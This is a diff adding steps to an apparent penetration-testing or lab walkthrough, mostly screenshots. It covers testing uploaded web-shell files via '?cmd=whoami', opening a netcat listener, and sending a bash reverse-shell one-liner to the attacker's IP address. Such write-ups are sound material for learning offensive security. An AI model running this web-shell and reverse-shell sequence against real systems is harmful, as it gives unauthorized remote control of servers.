@@ -221,11 +221,29 @@ CTRL+I
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/54f122a6-edc8-4635-b681-16e3006269c0"></picture></h3>
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/94670640-dd90-48e6-b2bc-000b9b72bd47"></picture></h3>
 <h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/9d3334b9-0725-4a3c-8287-b3d7d86036ed"></picture></h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/93e99499-3898-4587-b2e1-9a581959f2fa"></picture><br>Successfully uploaded the compatible files now we have to test which of them works</h3>
 
+### **- We will test the files by adding at the end ?cmd=whoami**
 
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/0840fa5b-3770-4740-b3bf-3511c2555707"></picture></h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/2c769303-9e6c-4c5f-9100-50a615086cdb"></picture><br>works!</h3>
 
+### **- Now we will enter a linner command to send us a reversehell to our attacker machine**
 
+### **We will listen on port 443 with NETCAT**
+```bash
+nc -nlvp 443
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/377d9fb7-f309-4725-a708-bdd6023d63a7"></picture></h3>
 
+### **In our browser we enter the linner command **
+
+```bash
+bash -c "bash -i >%26 /dev/tcp/192.168.1.188/443 0>%261"
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/cd0c3b3a-06cc-4966-ae72-aac89c3d2f0d"></picture><br>Now we will get a connection</h3>
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b1d69e65-8664-405a-b933-0bbcb9300158"></picture><br>We are in</h3>
 
 
 
